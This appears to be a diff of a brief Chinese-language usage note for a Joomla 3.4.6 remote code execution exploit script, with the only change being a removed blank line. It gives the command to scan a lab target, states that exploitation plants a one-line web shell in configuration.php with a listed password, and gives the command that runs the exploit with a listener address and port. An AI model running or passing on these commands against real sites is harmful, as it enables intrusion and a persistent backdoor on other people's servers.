@@ -5,5 +5,4 @@ python3 Joomla-3.4.6-RCE.py -t http://192.168.204.129/exploit/Joomla/
 漏洞利用
 在configuration.php中写入一句话木马,木马连接密码mbvmmqcrhfnsowwnyvhkkwjejbpytgnznswyefystnqbrirvvg
 
-
 python3 Joomla-3.4.6-RCE.py -t http://192.168.204.129/exploit/Joomla/ --exploit -l 192.168.204.129 -p 8080
